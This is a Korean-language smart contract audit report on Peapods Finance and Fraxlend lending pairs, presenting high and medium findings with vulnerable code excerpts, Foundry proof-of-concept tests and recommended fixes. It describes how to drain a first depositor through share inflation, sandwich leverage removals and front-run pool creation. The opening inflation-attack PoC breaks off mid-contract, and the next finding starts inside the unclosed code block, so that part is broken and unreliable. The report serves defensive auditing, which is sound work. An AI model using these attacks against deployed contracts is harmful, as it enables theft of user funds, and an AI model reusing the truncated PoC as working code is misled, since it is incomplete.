총 자산/증서가 내부 저장소 변수를 통해 추적되므로 Fraxlend 쌍에서는 기존의 금고 인플레이션 공격이 발생할 수 없습니다. 그러나 증서를 주조/소각할 때 반올림 방향을 악용하여 공격자는 단일 증서의 가치를 기하급수적으로 부풀려 첫 번째 예금자의 첫 번째 예금을 100% 훔치고 향후 해당 대출 쌍의 적절한 사용을 거부(DoS)할 수 있습니다.

이는 Fraxlend에 존재하지만 모든 대출 쌍이 이미 입금되었기 때문에 악용될 수 없습니다. 공격은 Peapods 금융 프로토콜에서 발생할 새로 생성된 쌍에서만 작동합니다.

## 개념 증명

`test/` 디렉토리 아래의 새 디렉토리에 다음 테스트 파일을 추가하십시오. PoC를 실행하려면 `contracts` 디렉토리 내에 fraxlend 저장소를 복제하고 `foundry.toml` 파일에 `"@fraxlend/=contracts/fraxlend/src/contracts/"` 리매핑을 추가해야 합니다.

PoC는 첫 번째 예금자의 전체 예금이 손실되어 공격자가 획득함을 보여줍니다.

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

import {FraxlendPairDeployer, ConstructorParams} from "@fraxlend/FraxlendPairDeployer.sol";
import {FraxlendWhitelist} from "@fraxlend/FraxlendWhitelist.sol";
import {FraxlendPairRegistry} from "@fraxlend/FraxlendPairRegistry.sol";
import {FraxlendPair} from "@fraxlend/FraxlendPair.sol";
import {VariableInterestRate} from "@fraxlend/VariableInterestRate.sol";
import {IERC4626Extended} from "@fraxlend/interfaces/IERC4626Extended.sol";

import {LendingAssetVault} from "contracts/LendingAssetVault.sol";
import {MockDualOracle} from "./MockDualOracle.sol";

import {console} from "forge-std/console.sol";

contract PairTest is Test {
    FraxlendPairDeployer deployer;
    FraxlendPair pair;
    ERC20 DAI = new ERC20("DAI", "DAI");

# [H-05] `_removeLeverage()`가 포드를 교환할 때 잘못된 금액을 제공함

## 심각도

**영향:** 높음

**가능성:** 중간

## 설명

`_removeLeverage`가 트리거될 때 `_pairedAmtReceived`가 `_repayAmount`보다 낮으면 `_acquireBorrowTokenForRepayment`가 트리거됩니다.

```solidity
    function _removeLeverage(bytes memory _userData)
        internal
        returns (uint256 _podAmtRemaining, uint256 _borrowAmtRemaining)
    {
        // ....

        // pay back flash loan and send remaining to borrower
        uint256 _repayAmount = _d.amount + _d.fee;
        if (_pairedAmtReceived < _repayAmount) {
>>>         _podAmtRemaining = _acquireBorrowTokenForRepayment(
                _props,
                _posProps.pod,
                _d.token,
                _repayAmount,
                _pairedAmtReceived,
                _podAmtReceived,
                _userProvidedDebtAmtMax
            );
        }
        IERC20(_d.token).safeTransfer(IFlashLoanSource(_getFlashSource(_props.positionId)).source(), _repayAmount);
        _borrowAmtRemaining = _pairedAmtReceived > _repayAmount ? _pairedAmtReceived - _repayAmount : 0;
        emit RemoveLeverage(_props.positionId, _props.user, _collateralAssetRemoveAmt);
    }
```

자체 대출 포드를 사용하는 포지션의 경우 `lendingPair`로 교환하고 lendingPair 증서를 `redeem`하여 실제 차입 토큰을 획득합니다.

```solidity
    function _acquireBorrowTokenForRepayment(
        LeverageFlashProps memory _props,
        address _pod,
        address _borrowToken,
        uint256 _repayAmount,
        uint256 _pairedAmtReceived,
        uint256 _podAmtReceived,
        uint256 _userProvidedDebtAmtMax
    ) internal returns (uint256 _podAmtRemaining) {
        _podAmtRemaining = _podAmtReceived;
        uint256 _borrowNeeded = _repayAmount - _pairedAmtReceived;
        uint256 _borrowAmtNeededToSwap = _borrowNeeded;
        if (_userProvidedDebtAmtMax > 0) {
            uint256 _borrowAmtFromUser =
                _userProvidedDebtAmtMax >= _borrowNeeded ? _borrowNeeded : _userProvidedDebtAmtMax;
            _borrowAmtNeededToSwap -= _borrowAmtFromUser;
            IERC20(_borrowToken).safeTransferFrom(_props.user, address(this), _borrowAmtFromUser);
        }
        // sell pod token into LP for enough borrow token to get enough to repay
        // if self-lending swap for lending pair then redeem for borrow token
        if (_borrowAmtNeededToSwap > 0) {
            if (_isPodSelfLending(_props.positionId)) {
                _podAmtRemaining = _swapPodForBorrowToken(
>>>                 _pod, positionProps[_props.positionId].lendingPair, _podAmtReceived, _borrowAmtNeededToSwap
                );
                _podAmtRemaining = IFraxlendPair(positionProps[_props.positionId].lendingPair).redeem(
                    _podAmtRemaining, address(this), address(this)
                );
            } else {
                _podAmtRemaining = _swapPodForBorrowToken(_pod, _borrowToken, _podAmtReceived, _borrowAmtNeededToSwap);
            }
        }
    }
```

`lendingPair`에 대해 요청된 출력으로 `_borrowAmtNeededToSwap`을 사용한 다음 이를 `redeem`합니다. 그러나 상환된 lendingPair 증서는 차입 토큰과 1:1이 아닙니다. 이는 문제를 일으킬 수 있습니다. 수령한 차입 토큰이 lendingPair의 `_borrowAmtNeededToSwap`을 초과하면 초과분은 사용자에게 반환되지 않습니다. 반대로 수령한 차입 토큰이 불충분하면 상환 금액을 충당하지 못하여 호출이 되돌려집니다.

## 권장 사항

`_swapPodForBorrowToken` 대신 `_borrowAmtNeededToSwap`에서 필요한 증서 금액을 제공하십시오.

# [H-06] 레버리지 제거 시 슬리피지 확인 없음

## 심각도

**영향:** 높음

**가능성:** 중간

## 설명

`LeverageManager`에서 레버리지를 제거할 때 포드 토큰을 차입 토큰으로 교환합니다.

```solidity
_podAmtRemaining = _swapPodForBorrowToken(_pod, _borrowToken, _podAmtReceived, _borrowAmtNeededToSwap);
```

이는 정확한 출력(exact output) 스왑이며 `amountInMax`는 사용 가능한 포드 토큰 수로 설정됩니다. 즉, 스왑에 슬리피지 보호가 0입니다. 악의적인 공격자는 이 트랜잭션을 샌드위치 공격하여 차입 토큰으로 교환할 때 포드 토큰을 최대로 사용하게 할 수 있습니다.

결국 `_podAmtRemaining`은 이로 인해 매우 작거나 `0`이 되므로 사용자는 마땅히 받아야 할 토큰보다 적은 토큰을 받게 됩니다.

## 권장 사항

사용자가 `podAmtOutMin`을 전달할 수 있도록 허용하는 것이 좋습니다. 이는 `_removeLeverage()`가 발생한 후 `LeverageManager.callback()` 내에서 확인됩니다. 이렇게 하면 불리한 가격으로 스왑이 발생할 경우 전체 트랜잭션이 되돌려집니다.

# [H-07] `pod` 토큰의 이체 수수료(fee-on-transfer) 특성 무시

## 심각도

**영향:** 중간

**가능성:** 높음

## 설명

`LeverageManager.addLeverage` 함수는 사용자로부터 수령하는 `_pod` 토큰의 실제 금액을 확인하지 않습니다.
`pod` 토큰 계약 소유자가 0이 아닌 이체 수수료를 설정할 수 있으므로 실제 수령한 금액은 `_pTknAmt` 값보다 작을 수 있으며,
이 값은 `indexUtils.addLPAndStake` 호출의 매개변수로 사용됩니다.
이로 인해 `indexUtils` 구현이 `LeverageManager` 계약에서 `_pTknAmt`를 전송하려고 시도하므로 불충분한 잔액 오류가 발생할 수 있습니다.

```solidity
    function addLeverage(
        uint256 _positionId,
        address _pod,
        uint256 _pTknAmt,
        uint256 _pairedLpDesired,
        uint256 _userProvidedDebtAmt,
        address _selfLendingPairPod,
        bytes memory _config
    ) external override workflow(true) {
        address _sender = _msgSender();
        if (_positionId == 0) {
            _positionId = _initializePosition(_pod, _sender, address(0), _selfLendingPairPod);
        } else {
            address _owner = positionNFT.ownerOf(_positionId);
            require(
                _owner == _sender || positionNFT.getApproved(_positionId) == _sender
                    || positionNFT.isApprovedForAll(_owner, _sender),
                "AUTH"
            );
            _pod = positionProps[_positionId].pod;
        }
        require(_getFlashSource(_positionId) != address(0), "FSV");

>>      IERC20(_pod).safeTransferFrom(_sender, address(this), _pTknAmt); // @audit pod token is FOT

        if (_userProvidedDebtAmt > 0) {
            IERC20(_getBorrowTknForPod(_positionId)).safeTransferFrom(_sender, address(this), _userProvidedDebtAmt);
        }

        // if additional fees required for flash source, handle that here
        _processExtraFlashLoanPayment(_positionId, _sender);

        IFlashLoanSource(_getFlashSource(_positionId)).flash(
            _getBorrowTknForPod(_positionId),
            _pairedLpDesired - _userProvidedDebtAmt,
            address(this),
            abi.encode(
                LeverageFlashProps({
                    method: FlashCallbackMethod.ADD,
                    positionId: _positionId,
                    user: _sender,
>>                  pTknAmt: _pTknAmt, // @audit pod token is FOT
                    pairedLpDesired: _pairedLpDesired,
                    config: _config
                }),
                ""
            )
        );
    }
<...>
    function _lpAndStakeInPod(address _borrowToken, uint256 _borrowAmt, LeverageFlashProps memory _props)
        internal
        returns (uint256 _pTknAmtUsed, uint256 _pairedLpUsed, uint256 _pairedLpLeftover)
    {
        (, uint256 _slippage, uint256 _deadline) = abi.decode(_props.config, (uint256, uint256, uint256));
        (address _pairedLpForPod, uint256 _pairedLpAmt) = _processAndGetPairedTknAndAmt(
            _props.positionId, _borrowToken, _borrowAmt, positionProps[_props.positionId].selfLendingPod
        );
        uint256 _podBalBefore = IERC20(positionProps[_props.positionId].pod).balanceOf(address(this));
        uint256 _pairedLpBalBefore = IERC20(_pairedLpForPod).balanceOf(address(this));
        IERC20(positionProps[_props.positionId].pod).safeIncreaseAllowance(address(indexUtils), _props.pTknAmt);
        IERC20(_pairedLpForPod).safeIncreaseAllowance(address(indexUtils), _pairedLpAmt);
        indexUtils.addLPAndStake(
            IDecentralizedIndex(positionProps[_props.positionId].pod),
>>          _props.pTknAmt, // @audit pod token is FOT
            _pairedLpForPod,
            _pairedLpAmt,
            0, // is not used so can use max slippage
            _slippage,
            _deadline
        );
        _pTknAmtUsed = _podBalBefore - IERC20(positionProps[_props.positionId].pod).balanceOf(address(this));
        _pairedLpUsed = _pairedLpBalBefore - IERC20(_pairedLpForPod).balanceOf(address(this));
        _pairedLpLeftover = _pairedLpBalBefore - _pairedLpUsed;
    }

```

## 권장 사항

`LeverageFlashProps.pTknAmt` 필드에 실제로 수령한 금액을 사용하는 것을 고려하십시오.

# [M-01] 유동성 추가 전 토큰 비율 균형을 위한 잘못된 공식

## 심각도

**영향:** 낮음

**가능성:** 높음

## 설명

V2 유동성 풀에 토큰 쌍을 추가하기 전에 쌍 토큰의 일부가 pTKN으로 교환됩니다. 교환할 금액이 올바르게 계산되지 않아 소량의 남은 토큰이 유동성 풀에 예치되지 못합니다.

환불 메커니즘이 없으므로 이 자금은 영구적으로 손실됩니다.

현재 사용되는 공식은 다음과 같습니다.

```
return (_sqrt(_r * (_r * 3988000 + _fullAmt * 3988009)) - (_r * 1997)) / 1994;
```

그러나 올바른 공식은 다음과 같습니다.

```solidity
uint256 correct_way = (_sqrt(_r * (_fullAmt * 3988000 + _r * 3988009)) - (_r * 1997)) / 1994;
```

## 개념 증명

C-02의 테스트 설정을 사용하여 `AutoCompoundPoC`에 다음 테스트 케이스를 추가하십시오.

```solidity
function testJ_autoCompound_leftovers() public {
        deal(address(peas), address(aspTkn), 100e18);

        // 2 tokens: pod, dai
        uint256 DAIbalanceBefore = DAI.balanceOf(address(aspTkn));
        uint256 PODbalanceBefore = pod.balanceOf(address(aspTkn));

        DAI.approve(address(aspTkn), type(uint256).max);
        pod.approve(address(aspTkn), type(uint256).max);
        uint256 processedLp = aspTkn.processAllRewardsTokensToPodLp(0, block.timestamp);
        aspTkn.withdrawProtocolFees();

        uint256 DAIbalanceAfter = DAI.balanceOf(address(aspTkn));
        uint256 PODbalanceAfter = pod.balanceOf(address(aspTkn));

        console.log("DAI: %e-->%e", DAIbalanceBefore, DAIbalanceAfter);
        console.log("POD: %e-->%e", PODbalanceBefore, PODbalanceAfter);
    }
```

테스트를 실행하면 다음과 같은 콘솔 출력이 생성됩니다.

```solidity
DAI: 0e0-->8.9070809456503958e16
POD: 0e0-->0e0
```

이는 8.91e16 DAI가 계약에 남아 있음을 보여줍니다. 이는 ~0.09%의 손실입니다.

`AutoCompoundingPodLp`의 `_getSwapAmt()`를 제안된 공식을 사용하도록 업데이트하고 테스트를 다시 실행하면 다음과 같은 출력이 생성됩니다.

```solidity
DAI: 0e0-->1e0
POD: 0e0-->0e0
```

여기서는 이 공식을 사용할 때 예상되는 1 wei의 나머지 잔액만 있습니다.

## 권장 사항

`_getSwapAmt()`에서 올바른 공식을 사용하십시오.

```solidity
uint256 correct_way = (_sqrt(_r * (_fullAmt * 3988000 + _r * 3988009)) - (_r * 1997)) / 1994;
return correct_way;
```

# [M-02] externalAssetVault가 설정되지 않은 경우 쌍을 예치할 수 없음

## 심각도

**영향:** 중간

**가능성:** 중간

## 설명

`FraxlendPairCore._repayAsset()` 함수는 외부 금고에 대한 외부 호출을 수행하기 전에 다음 확인을 수행합니다.

```solidity
        if (address(externalAssetVault) != address(0)) {
```

그러나 이 확인은 `FraxlendPairCore._deposit()`가 `externalAssetVault`에 대한 외부 호출을 수행하기 전에는 포함되지 않습니다.

즉, `externalAssetVault`가 설정되지 않은 경우 예치가 항상 되돌려지므로 대출 쌍은 대출 자산 금고와 독립적으로 작동할 수 없습니다.

## 권장 사항

`_deposit()`에서 호출하기 전에 `externalAssetVault != address(0)`인지 확인하십시오.

# [M-03] `addInterest()`가 저장소에서 `currentRateInfo`를 가져오지 않음

## 심각도

**영향:** 낮음

**가능성:** 높음

## 설명

`FraxlendPairCore.addInterest()`에서 현재 활용률을 가져옵니다.

```solidity
function addInterest(bool _returnAccounting)
        external
        nonReentrant
        returns (
            uint256 _interestEarned,
            uint256 _feesAmount,
            uint256 _feesShare,
            CurrentRateInfo memory _currentRateInfo,
            VaultAccount memory _totalAsset,
            VaultAccount memory _totalBorrow
        )
    {
        uint256 _currentUtilizationRate = _currentRateInfo.fullUtilizationRate;
```

문제는 `_currentRateInfo` 구조체가 방금 초기화되었으며 `currentRateInfo` 저장소 변수에 저장된 저장된 활용률을 포함하지 않는다는 것입니다.

이로 인해 `_rateChange`가 항상 이자율 업데이트를 보장할 만큼 높아져 프로토콜 의도와 반대됩니다. 이는 이용 가능한 차익 거래 기회를 제한하고 가스 비용을 증가시킵니다.

## 권장 사항

사용하기 전에 저장소에서 현재 금리 정보를 얻으십시오.

```solidity
_currentRateInfo = currentRateInfo;
```

# [M-04] `withdraw/redeem`이 수령한 자산을 계산하지 않음

## 심각도

**영향:** 중간

**가능성:** 중간

## 설명

`AutoCompoundingPodLp.withdraw/redeem`은 먼저 수령하거나 소각할 `assets/shares`를 계산한 다음 `_withdraw`를 트리거하여 증서를 소각하고 계산된 자산을 사용자에게 전송합니다. 그러나 사용자를 위해 계산된 자산이나 소각된 증서는 처리된 보상을 고려하지 않으며, 이는 `_withdraw` 작업 내에서 나중에 트리거되기 때문입니다.

```solidity
    function withdraw(uint256 _assets, address _receiver, address _owner) external override returns (uint256 _shares) {
>>>     _shares = convertToShares(_assets);
        _withdraw(_assets, _shares, _msgSender(), _owner, _receiver);
    }
```

```solidity
    function redeem(uint256 _shares, address _receiver, address _owner) external override returns (uint256 _assets) {
>>>     _assets = convertToAssets(_shares);
        _withdraw(_assets, _shares, _msgSender(), _owner, _receiver);
    }
```

```solidity
    function _withdraw(uint256 _assets, uint256 _shares, address _caller, address _owner, address _receiver) internal {
        require(_shares != 0, "B");

        if (_caller != _owner) {
            _spendAllowance(_owner, _caller, _shares);
        }

>>>     _processRewardsToPodLp(0, block.timestamp);

        _totalAssets -= _assets;
        _burn(_owner, _shares);
        IERC20(_asset()).safeTransfer(_receiver, _assets);
        emit Withdraw(_owner, _receiver, _receiver, _assets, _shares);
    }
```

이로 인해 `withdraw/redeem` 작업이 최신 `totalAssets`를 고려하지 않아 사용자가 마땅히 받아야 할 자산을 잃게 됩니다.

## 권장 사항

`_shares` 및 `_assets`를 계산하기 전에 `_processRewardsToPodLp`를 트리거하십시오.

# [M-05] DIA 오라클의 잘못된 가격에도 가격이 수락될 수 있음

## 심각도

**영향:** 높음

**가능성:** 낮음

## 설명:

1.) DIAOracleV2SinglePriceOracle.sol의 getPriceUSD18 함수 ->

```solidity
function getPriceUSD18(
        address _clBaseConversionPoolPriceFeed,
        address _quoteToken,
        address _quoteDIAOracle,
        uint256
    ) external view virtual override returns (bool _isBadData, uint256 _price18) {
        string memory _symbol = IERC20Metadata(_quoteToken).symbol();
        (uint128 _quotePrice8, uint128 _refreshedLast) =
            IDIAOracleV2(_quoteDIAOracle).getValue(string.concat(_symbol, "/USD"));
        if (_refreshedLast + staleAfterLastRefresh < block.timestamp) {
            _isBadData = true;
        }

        // default base price to 1, which just means return only quote pool price without any base conversion
        uint256 _basePrice18 = 10 ** 18;
        uint256 _updatedAt = block.timestamp;
        if (_clBaseConversionPoolPriceFeed != address(0)) {
            (_basePrice18, _updatedAt, _isBadData) = _getChainlinkPriceFeedPrice18(_clBaseConversionPoolPriceFeed);
        }
        _price18 = (_quotePrice8 * _basePrice18) / 10 ** 8;
    }
```

2.) DIA 오라클에서 반환된 견적 토큰 가격이 잘못되었다고 가정해 보겠습니다. 즉, 여기에서 ->

`if (_refreshedLast + staleAfterLastRefresh < block.timestamp) {
            _isBadData = true;
        }` , 따라서 isBadData는 true입니다.

3.) 그 후 기본 가격을 얻습니다 ->

`if (_clBaseConversionPoolPriceFeed != address(0)) {
            (_basePrice18, _updatedAt, _isBadData) = _getChainlinkPriceFeedPrice18(_clBaseConversionPoolPriceFeed);
        }`
기본 가격이 정확하다고 가정하면, 따라서 `isDataBad`는 false이고 최종 가격이 계산됩니다.

이는 최종 가격이 부정확할 것임을 의미하며(견적 토큰 가격 데이터가 나쁨/오래되었기 때문에), 기본 가격을 chainlink 가격 피드에서 가져올 때 `_isBadData`가 false로 덮어쓰여지므로 반환된 값은 잘못된 가격과 false인 isBadData가 됩니다.

## 권장 사항:

견적 가격 데이터가 나쁘면 그냥 true와 0을 반환하십시오.

# [M-06] `LeverageManager`가 여러 토큰으로 구성된 `selfLendingPod`와 작동하지 않음

## 심각도

**영향:** 높음

**가능성:** 낮음

## 설명

레버리지 포지션이 `selfLendingPod`를 사용할 때 차입 토큰과 최종 쌍 토큰 간에 변환하기 위해 `bond` 및 `debond`를 수행합니다.

```solidity
    function _processAndGetPairedTknAndAmt(
        uint256 _positionId,
        address _borrowedTkn,
        uint256 _borrowedAmt,
        address _selfLendingPairPod
    ) internal returns (address _finalPairedTkn, uint256 _finalPairedAmt) {
        _finalPairedTkn = _borrowedTkn;
        _finalPairedAmt = _borrowedAmt;
        address _lendingPair = positionProps[_positionId].lendingPair;
        if (_isPodSelfLending(_positionId)) {
            _finalPairedTkn = _lendingPair;
            IERC20(_borrowedTkn).safeIncreaseAllowance(_lendingPair, _finalPairedAmt);
            _finalPairedAmt = IFraxlendPair(_lendingPair).deposit(_finalPairedAmt, address(this));

            // self lending+podded
            if (_selfLendingPairPod != address(0)) {
                _finalPairedTkn = _selfLendingPairPod;
>>>             IERC20(_lendingPair).safeIncreaseAllowance(_selfLendingPairPod, _finalPairedAmt);
>>>             IDecentralizedIndex(_selfLendingPairPod).bond(_lendingPair, _finalPairedAmt, 0);
                _finalPairedAmt = IERC20(_selfLendingPairPod).balanceOf(address(this));
            }
        }
    }
```

```solidity
    function _debondFromSelfLendingPod(address _pod, uint256 _amount) internal returns (uint256 _amtOut) {
        IDecentralizedIndex.IndexAssetInfo[] memory _podAssets = IDecentralizedIndex(_pod).getAllAssets();
        address[] memory _tokens = new address[](1);
        uint8[] memory _percentages = new uint8[](1);
        _tokens[0] = _podAssets[0].token;
        _percentages[0] = 100;
>>>     IDecentralizedIndex(_pod).debond(_amount, _tokens, _percentages);
        _amtOut = IERC20(_tokens[0]).balanceOf(address(this));
    }
```

```solidity
    function _spTknToAspTkn(address _spTKN, uint256 _pairedRemainingAmt, LeverageFlashProps memory _props)
        internal
        returns (uint256 _newAspTkns)
    {
        // uint256 _aspTknCollateralBal =
        // _spTknToAspTkn(IDecentralizedIndex(_pod).lpStakingPool(), _pairedLeftover, _props);
        address _aspTkn = _getAspTkn(_props.positionId);
        uint256 _stakingBal = IERC20(_spTKN).balanceOf(address(this));
        IERC20(_spTKN).safeIncreaseAllowance(_aspTkn, _stakingBal);
        _newAspTkns = IERC4626(_aspTkn).deposit(_stakingBal, address(this));

        // for self lending pods redeem any extra paired LP asset back into main asset
        if (_isPodSelfLending(_props.positionId) && _pairedRemainingAmt > 0) {
            if (positionProps[_props.positionId].selfLendingPod != address(0)) {
                address[] memory _noop1;
                uint8[] memory _noop2;
>>>             IDecentralizedIndex(positionProps[_props.positionId].selfLendingPod).debond(
                    _pairedRemainingAmt, _noop1, _noop2
                );
                _pairedRemainingAmt = IERC20(positionProps[_props.positionId].lendingPair).balanceOf(address(this));
            }
            IFraxlendPair(positionProps[_props.positionId].lendingPair).redeem(
                _pairedRemainingAmt, address(this), address(this)
            );
        }
    }
```

그러나 `selfLendingPod`가 `lendingPair`로만 구성되어 있다고 가정하는 것을 관찰할 수 있습니다. 여러 토큰으로 구성된 경우 함수는 항상 되돌려집니다.

## 권장 사항

여러 토큰이 있는 포드를 지원하거나 포지션이 생성될 때 `selfLendingPod`가 두 개 이상의 토큰으로 구성된 경우 작업을 되돌리십시오.

# [M-07] `_pairedLpTokenToPodLp`가 `pod` 및 `_pairedLpToken`을 고려하지 않음

## 심각도

**영향:** 높음

**가능성:** 낮음

## 설명

`_pairedLpTokenToPodLp`가 호출되면 `_pairedLpToken` 및 `pod` 토큰을 제공하여 `indexUtils.addLPAndStake`를 호출하려고 시도합니다.

```solidity
    function _pairedLpTokenToPodLp(uint256 _amountIn, uint256 _deadline) internal returns (uint256 _amountOut) {
        address _pairedLpToken = pod.PAIRED_LP_TOKEN();
        uint256 _pairedSwapAmt = _getSwapAmt(_pairedLpToken, address(pod), _pairedLpToken, _amountIn);
        uint256 _pairedRemaining = _amountIn - _pairedSwapAmt;
        uint256 _minPtknOut;
        if (address(podOracle) != address(0)) {
            // calculate the min out with 5% slippage
            _minPtknOut = (
                podOracle.getPodPerBasePrice() * _pairedSwapAmt * 10 ** IERC20Metadata(address(pod)).decimals() * 95
            ) / 10 ** IERC20Metadata(_pairedLpToken).decimals() / 10 ** 18 / 100;
        }
        IERC20(_pairedLpToken).safeIncreaseAllowance(address(DEX_ADAPTER), _pairedSwapAmt);
        try DEX_ADAPTER.swapV2Single(_pairedLpToken, address(pod), _pairedSwapAmt, _minPtknOut, address(this)) returns (
            uint256 _podAmountOut
        ) {
            IERC20(pod).safeIncreaseAllowance(address(indexUtils), _podAmountOut);
            IERC20(_pairedLpToken).safeIncreaseAllowance(address(indexUtils), _pairedRemaining);
            try indexUtils.addLPAndStake(
                pod, _podAmountOut, _pairedLpToken, _pairedRemaining, _pairedRemaining, LP_SLIPPAGE, _deadline
            ) returns (uint256 _lpTknOut) {
                _amountOut = _lpTknOut;
>>>         } catch {
                IERC20(pod).safeDecreaseAllowance(address(indexUtils), _podAmountOut);
                IERC20(_pairedLpToken).safeDecreaseAllowance(address(indexUtils), _pairedRemaining);
                emit AddLpAndStakeError(address(pod), _amountIn);
            }
        } catch {
            IERC20(_pairedLpToken).safeDecreaseAllowance(address(DEX_ADAPTER), _pairedSwapAmt);
            emit AddLpAndStakeV2SwapError(_pairedLpToken, address(pod), _pairedRemaining);
        }
    }
```

그러나 `addLPAndStake` 호출이 실패하면 `pod` 및 `_pairedLpToken`이 제대로 추적되지 않아 토큰이 계약 내부에 갇히게 됩니다.

## 권장 사항

`addLPAndStake` 호출이 되돌려질 경우를 대비하여 `pod` 및 `_pairedLpToken`을 적절하게 처리하는 것을 고려하십시오.

# [M-08] 이미 풀이 생성된 경우 `WeightedIndex` 생성이 항상 실패할 수 있음

## 심각도

**영향:** 높음

**가능성:** 낮음

## 설명

`WeightedIndex`가 처음 생성될 때 포드 및 인덱스 토큰으로 V2 풀을 생성하려고 시도합니다.

```solidity
    constructor(
        string memory _name,
        string memory _symbol,
        Config memory _config,
        Fees memory _fees,
        address[] memory _tokens,
        uint256[] memory _weights,
        bool _stakeRestriction,
        bool _leaveRewardsAsPairedLp,
        bytes memory _immutables
    )
        DecentralizedIndex(
            _name,
            _symbol,
            IndexType.WEIGHTED, // @audit - when indexType is used?
            _config,
            _fees,
            _stakeRestriction,
            _leaveRewardsAsPairedLp,
            _immutables
        )
    {
      // ....

            (address _pairedLpToken,,,,,, address _dexAdapter) =
                abi.decode(_immutables, (address, address, address, address, address, address, address));
            if (_config.blacklistTKNpTKNPoolV2 && _tokens[_i] != _pairedLpToken) {
>>>             address _blkPool = IDexAdapter(_dexAdapter).createV2Pool(address(this), _tokens[_i]);
                _blacklist[_blkPool] = true;
            }
        }
        // at idx == 0, need to find X in [1/X = tokenWeightAtIdx/totalWeights]
        // at idx > 0, need to find Y in (Y/X = tokenWeightAtIdx/totalWeights)
        uint256 _xX96 = (FixedPoint96.Q96 * _totalWeights) / _weights[0];
        for (uint256 _i; _i < _tl; _i++) {
            indexTokens[_i].q1 = (_weights[_i] * _xX96 * 10 ** IERC20Metadata(_tokens[_i]).decimals()) / _totalWeights;
        }
    }
```

그러나 `WeightedIndex`의 주소를 예측할 수 있는 공격자가 풀 생성을 프런트러닝하여 풀이 이미 존재하기 때문에 `createV2Pool`이 되돌려지게 할 수 있습니다.

## 권장 사항

풀이 아직 존재하지 않는 경우에만 `createV2Pool`을 호출하는 것을 고려하십시오.

# [M-09] 첫 번째 `bond` 호출자가 DoS를 유발할 수 있음

## 심각도

**영향:** 높음

**가능성:** 낮음

## 설명

첫 번째 `bond` 호출자는 `_tokensMinted`를 만들기에 충분하지만 `_transferAmt`의 나머지가 0이 되도록 하는 `_amount`를 제공하여 더스트(dust) 토큰 금액을 제공함으로써 DoS를 유발할 수 있습니다.

```solidity
    function _bond(address _token, uint256 _amount, uint256 _amountMintMin, address _user) internal {
        require(_isTokenInIndex[_token], "IT");
        uint256 _tokenIdx = _fundTokenIdx[_token];

        bool _firstIn = _isFirstIn();
        uint256 _tokenAmtSupplyRatioX96 =
            _firstIn ? FixedPoint96.Q96 : (_amount * FixedPoint96.Q96) / _totalAssets[_token];
        uint256 _tokensMinted;
        if (_firstIn) {
            _tokensMinted = (_amount * FixedPoint96.Q96 * 10 ** decimals()) / indexTokens[_tokenIdx].q1;
        } else {
            _tokensMinted = (_totalSupply * _tokenAmtSupplyRatioX96) / FixedPoint96.Q96;
        }
        uint256 _feeTokens = _canWrapFeeFree(_user) ? 0 : (_tokensMinted * fees.bond) / DEN;
        require(_tokensMinted - _feeTokens >= _amountMintMin, "M");
        _totalSupply += _tokensMinted;
        _mint(_user, _tokensMinted - _feeTokens);
        if (_feeTokens > 0) {
            _mint(address(this), _feeTokens);
            _processBurnFee(_feeTokens);
        }
        uint256 _il = indexTokens.length;
        for (uint256 _i; _i < _il; _i++) {
>>>         uint256 _transferAmt = _firstIn
                ? getInitialAmount(_token, _amount, indexTokens[_i].token)
                // (_amount * FixedPoint96.Q96) / _totalAssets[_token];
                : (_totalAssets[indexTokens[_i].token] * _tokenAmtSupplyRatioX96) / FixedPoint96.Q96;
>>>         _totalAssets[indexTokens[_i].token] += _transferAmt;
            _transferFromAndValidate(IERC20(indexTokens[_i].token), _user, _transferAmt);
        }
        _internalBond();
        emit Bond(_user, _token, _amount, _tokensMinted);
    }
```

```solidity
    function getInitialAmount(address _sourceToken, uint256 _sourceAmount, address _targetToken)
        public
        view
        override
        returns (uint256)
    {
        uint256 _sourceTokenIdx = _fundTokenIdx[_sourceToken];
        uint256 _targetTokenIdx = _fundTokenIdx[_targetToken];
        return (_sourceAmount * indexTokens[_targetTokenIdx].weighting * 10 ** IERC20Metadata(_targetToken).decimals())
            / indexTokens[_sourceTokenIdx].weighting / 10 ** IERC20Metadata(_sourceToken).decimals();
    }
```

이로 인해 총 공급량은 0이 아닌 값으로 증가하는 반면 제공된 `_token` 이외의 자산에 대한 `_totalAssets`는 0으로 유지됩니다. 이는 다른 사용자가 공격자가 사용한 토큰과 다른 토큰을 사용하여 `bond`를 시도하면 `_totalAssets`가 0이기 때문에 함수가 되돌려지므로 DoS로 이어질 수 있습니다. 사용자가 공격자와 동일한 토큰을 사용하는 경우 `_transferAmt`를 계산할 때 `_totalAssets`가 항상 0이므로 나머지 다른 토큰은 사용되거나 증가하지 않습니다.

```solidity
    function _bond(address _token, uint256 _amount, uint256 _amountMintMin, address _user) internal {
        require(_isTokenInIndex[_token], "IT");
        uint256 _tokenIdx = _fundTokenIdx[_token];

        bool _firstIn = _isFirstIn();
        uint256 _tokenAmtSupplyRatioX96 =
>>>         _firstIn ? FixedPoint96.Q96 : (_amount * FixedPoint96.Q96) / _totalAssets[_token];
        uint256 _tokensMinted;
        if (_firstIn) {
            _tokensMinted = (_amount * FixedPoint96.Q96 * 10 ** decimals()) / indexTokens[_tokenIdx].q1;
        } else {
            _tokensMinted = (_totalSupply * _tokenAmtSupplyRatioX96) / FixedPoint96.Q96;
        }
        uint256 _feeTokens = _canWrapFeeFree(_user) ? 0 : (_tokensMinted * fees.bond) / DEN;
        require(_tokensMinted - _feeTokens >= _amountMintMin, "M");
        _totalSupply += _tokensMinted;
        _mint(_user, _tokensMinted - _feeTokens);
        if (_feeTokens > 0) {
            _mint(address(this), _feeTokens);
            _processBurnFee(_feeTokens);
        }
        uint256 _il = indexTokens.length;
        for (uint256 _i; _i < _il; _i++) {
            uint256 _transferAmt = _firstIn
                ? getInitialAmount(_token, _amount, indexTokens[_i].token)
                // (_amount * FixedPoint96.Q96) / _totalAssets[_token];
 >>>            : (_totalAssets[indexTokens[_i].token] * _tokenAmtSupplyRatioX96) / FixedPoint96.Q96;
            _totalAssets[indexTokens[_i].token] += _transferAmt;
            _transferFromAndValidate(IERC20(indexTokens[_i].token), _user, _transferAmt);
        }
        _internalBond();
        emit Bond(_user, _token, _amount, _tokensMinted);
    }
```

## 권장 사항

계산된 `_transferAmt`가 0일 때 되돌리는 것을 고려하십시오.

# [M-10] `whitelistUpdate()` 호출 없이 `_assetsUtilized`를 얻음
